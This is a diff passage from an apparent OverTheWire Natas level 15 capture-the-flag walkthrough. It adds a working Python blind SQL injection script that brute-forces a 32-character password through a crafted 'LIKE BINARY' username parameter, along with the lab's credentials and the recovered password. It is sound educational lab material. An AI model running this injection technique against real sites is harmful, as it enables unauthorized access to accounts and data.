@@ -264,4 +264,29 @@ code for finding the charset via bruteforce method of checking as follows:
             if "This user exists" in r.text:
                     charset_1 += c
                     print ('CSET: ' + charset_1.ljust(len(charset_0), '*'))
+Excecuting this code will result us with the charset of password that we need to look for bruteforcing:"23579adfgijklqruADEHOPRTVZ"
 
+After getting the charset go with iterating each value of the charset seperate addon with each and bruteforce it with the site for checking it with the password.
+
+Now let's try to perform a brute force attack against a 32 chars string (previous passwords were 32 chars strings) with this Python script
+
+The code for it as follows:
+
+    import requests
+    target = 'http://natas15.natas.labs.overthewire.org'
+    charset_1 = "23579adfgijklqruADEHOPRTVZ"
+
+    password = ""
+    while len(password) != 32:
+            for c in charset_1:
+                    t = password + c
+                    username = ('natas16" AND password LIKE BINARY "' + t +'%" "')
+                    r = requests.get(target,
+                            auth=('natas15','TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB'),
+                            params={"username": username}
+                    )
+                    if "This user exists" in r.text:
+                            print ('PASS: ' + t.ljust(32, '*'))
+                            password = t
+                            break
+We will be getting the password for the next level as "TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V"
